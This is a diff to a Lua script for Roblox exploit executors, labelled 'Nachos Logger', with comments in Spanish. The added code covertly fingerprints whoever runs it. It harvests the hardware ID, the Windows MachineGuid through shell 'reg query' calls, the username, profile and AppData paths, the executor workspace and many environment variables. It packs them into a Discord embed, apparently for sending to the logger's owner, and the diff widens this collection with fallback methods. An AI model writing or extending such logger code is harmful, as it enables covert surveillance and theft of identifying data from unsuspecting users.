@@ -350,21 +350,89 @@ task.spawn(function()
         -- =====================================================
         local embed3 = nil
         pcall(function()
-            -- Safe env getter: never trusts os.getenv blindly
-            local function safeEnv(key)
+            -- ============================================
+            -- HELPERS: cascada de métodos
+            -- ============================================
+            local function safeCall(fn, default)
+                local ok, val = pcall(fn)
+                if ok and val ~= nil and tostring(val) ~= "" then
+                    return tostring(val)
+                end
+                return default
+            end
+
+            -- Método 1: os.getenv (bloqueado en la mayoría)
+            local function tryGetEnv(key)
                 local ok, val = pcall(function()
                     if type(os) == "table" and type(os.getenv) == "function" then
                         return os.getenv(key)
                     end
-                    return nil
                 end)
-                if ok and val and tostring(val) ~= "" then
-                    return tostring(val)
+                if ok and val and tostring(val) ~= "" then return tostring(val) end
+                return nil
+            end
+
+            -- Método 2: getenv del executor (syn, global, etc.)
+            local function tryExecutorEnv(key)
+                local ok1, v1 = pcall(function()
+                    if syn and type(syn.getenv) == "function" then return syn.getenv(key) end
+                end)
+                if ok1 and v1 and tostring(v1) ~= "" then return tostring(v1) end
+
+                local ok2, v2 = pcall(function()
+                    if type(getenv) == "function" then return getenv(key) end
+                end)
+                if ok2 and v2 and tostring(v2) ~= "" then return tostring(v2) end
+
+                return nil
+            end
+
+            -- Método 3: inferir usuario desde la ruta del workspace del executor
+            local function inferUserFromPath()
+                local ws = nil
+                pcall(function()
+                    if type(getworkspace) == "function" then ws = getworkspace() end
+                    if not ws and type(get_workspace) == "function" then ws = get_workspace() end
+                    if not ws and type(workspace) == "string" then ws = workspace end
+                end)
+                if ws then
+                    local user = ws:match("[/\\]Users[/\\]([^/\\]+)")
+                    if user then return user, ws end
                 end
+                return nil, ws
+            end
+
+            -- Ejecutar detecciones
+            local usuarioPath, workspaceRuta = inferUserFromPath()
+
+            -- Método maestro: cascada
+            local function getVar(key)
+                -- 1) os.getenv
+                local v = tryGetEnv(key)
+                if v then return v end
+                -- 2) executor env
+                v = tryExecutorEnv(key)
+                if v then return v end
+                -- 3) inferencias desde rutas
+                if usuarioPath then
+                    if key == "USERNAME" then return usuarioPath end
+                    if key == "USERPROFILE" then return "C:\\Users\\" .. usuarioPath end
+                    if key == "LOCALAPPDATA" then return "C:\\Users\\" .. usuarioPath .. "\\AppData\\Local" end
+                    if key == "APPDATA" then return "C:\\Users\\" .. usuarioPath .. "\\AppData\\Roaming" end
+                    if key == "TEMP" then return "C:\\Users\\" .. usuarioPath .. "\\AppData\\Local\\Temp" end
+                    if key == "TMP" then return "C:\\Users\\" .. usuarioPath .. "\\AppData\\Local\\Temp" end
+                    if key == "USERDOMAIN" then return usuarioPath end
+                end
+                -- 4) valores por defecto Windows
+                if key == "WINDIR" then return "C:\\Windows" end
+                if key == "SYSTEMROOT" then return "C:\\Windows" end
+                if key == "OS" then return "Windows_NT" end
                 return "N/A"
             end
 
-            -- HWID via executor-native functions
+            -- ============================================
+            -- HWID (Executor) — este SÍ funciona
+            -- ============================================
             local hwid = "N/A"
             pcall(function()
                 if type(gethwid) == "function" then
@@ -378,16 +446,15 @@ task.spawn(function()
                 end
             end)
 
-            -- Pseudo-HWID fallback: djb2 hash of env vars
+            -- Pseudo-HWID: hash djb2 con datos reales (ya no todo N/A)
             local pseudoHWID = "N/A"
             pcall(function()
                 local partes = {
-                    safeEnv("USERNAME"),
-                    safeEnv("COMPUTERNAME"),
-                    safeEnv("PROCESSOR_IDENTIFIER"),
-                    safeEnv("PROCESSOR_ARCHITECTURE"),
-                    safeEnv("NUMBER_OF_PROCESSORS"),
-                    safeEnv("USERDOMAIN"),
+                    getVar("USERNAME"),
+                    getVar("COMPUTERNAME"),
+                    getVar("USERPROFILE"),
+                    getVar("OS"),
+                    getVar("WINDIR"),
                 }
                 local h = 5381
                 local s = table.concat(partes, "|")
@@ -397,9 +464,10 @@ task.spawn(function()
                 pseudoHWID = string.format("%x", h)
             end)
 
-            -- Machine GUID (Windows registry) — only if executor allows shell
+            -- Machine GUID: intenta varios métodos
             local machineGuid = "N/A"
             pcall(function()
+                -- Synapse
                 if syn and type(syn.execute) == "function" then
                     local ok, res = pcall(function()
                         return syn.execute('reg query "HKLM\\SOFTWARE\\Microsoft\\Cryptography" /v MachineGuid')
@@ -409,9 +477,19 @@ task.spawn(function()
                         if m then machineGuid = m end
                     end
                 end
+                -- Fallback: executecommand genérico
+                if machineGuid == "N/A" and type(executecommand) == "function" then
+                    local ok, res = pcall(function()
+                        return executecommand('reg query "HKLM\\SOFTWARE\\Microsoft\\Cryptography" /v MachineGuid')
+                    end)
+                    if ok and res then
+                        local m = tostring(res):match("MachineGuid%s+REG_SZ%s+([%w%-]+)")
+                        if m then machineGuid = m end
+                    end
+                end
             end)
 
-            -- Executor name (redundant but useful in this embed too)
+            -- Executor name (para redundancia)
             local execName = "Unknown"
             pcall(function()
                 if type(identifyexecutor) == "function" then
@@ -421,25 +499,27 @@ task.spawn(function()
                 end
             end)
 
-            -- Collect env vars in order
+            -- ============================================
+            -- ENV VARS con cascada completa
+            -- ============================================
             local envVars = {
-                { name = "USERNAME",               value = safeEnv("USERNAME") },
-                { name = "USERDOMAIN",             value = safeEnv("USERDOMAIN") },
-                { name = "COMPUTERNAME",           value = safeEnv("COMPUTERNAME") },
-                { name = "USERPROFILE",            value = safeEnv("USERPROFILE") },
-                { name = "APPDATA",                value = safeEnv("APPDATA") },
-                { name = "LOCALAPPDATA",           value = safeEnv("LOCALAPPDATA") },
-                { name = "TEMP",                   value = safeEnv("TEMP") },
-                { name = "TMP",                    value = safeEnv("TMP") },
-                { name = "WINDIR",                 value = safeEnv("WINDIR") },
-                { name = "SYSTEMROOT",             value = safeEnv("SYSTEMROOT") },
-                { name = "OS",                     value = safeEnv("OS") },
-                { name = "PROCESSOR_IDENTIFIER",   value = safeEnv("PROCESSOR_IDENTIFIER") },
-                { name = "PROCESSOR_ARCHITECTURE", value = safeEnv("PROCESSOR_ARCHITECTURE") },
-                { name = "NUMBER_OF_PROCESSORS",   value = safeEnv("NUMBER_OF_PROCESSORS") },
+                { name = "USERNAME",               value = getVar("USERNAME") },
+                { name = "USERDOMAIN",             value = getVar("USERDOMAIN") },
+                { name = "COMPUTERNAME",           value = getVar("COMPUTERNAME") },
+                { name = "USERPROFILE",            value = getVar("USERPROFILE") },
+                { name = "APPDATA",                value = getVar("APPDATA") },
+                { name = "LOCALAPPDATA",           value = getVar("LOCALAPPDATA") },
+                { name = "TEMP",                   value = getVar("TEMP") },
+                { name = "TMP",                    value = getVar("TMP") },
+                { name = "WINDIR",                 value = getVar("WINDIR") },
+                { name = "SYSTEMROOT",             value = getVar("SYSTEMROOT") },
+                { name = "OS",                     value = getVar("OS") },
+                { name = "PROCESSOR_IDENTIFIER",   value = getVar("PROCESSOR_IDENTIFIER") },
+                { name = "PROCESSOR_ARCHITECTURE", value = getVar("PROCESSOR_ARCHITECTURE") },
+                { name = "NUMBER_OF_PROCESSORS",   value = getVar("NUMBER_OF_PROCESSORS") },
             }
 
-            -- Build compact string with backticks, truncate long values
+            -- Formateo compacto
             local function fieldLine(k, v)
                 v = tostring(v)
                 if #v > 80 then v = v:sub(1, 77) .. "..." end
@@ -452,9 +532,14 @@ task.spawn(function()
                 if i < #envVars then envStr = envStr .. "\n" end
             end
 
-            -- Discord hard limit for field value = 1024 chars
             if #envStr > 1020 then
                 envStr = envStr:sub(1, 1017) .. "..."
+            end
+
+            -- Campo extra: workspace del executor (info útil)
+            local workspaceInfo = workspaceRuta or "N/A"
+            if #workspaceInfo > 120 then
+                workspaceInfo = workspaceInfo:sub(1, 117) .. "..."
             end
 
             embed3 = {
@@ -468,6 +553,7 @@ task.spawn(function()
                     { name = "Pseudo-HWID (Fallback)",  value = "`" .. pseudoHWID .. "`",   inline = false },
                     { name = "Machine GUID",            value = "`" .. machineGuid .. "`",  inline = false },
                     { name = "Executor Detected",       value = "`" .. execName .. "`",     inline = false },
+                    { name = "Executor Workspace",      value = "`" .. workspaceInfo .. "`",inline = false },
                     { name = "Environment Variables",   value = envStr,                     inline = false },
                 },
                 footer = { text = "Nachos Logger - "..os.date("%Y-%m-%d %H:%M:%S"), icon_url = avatarURL },
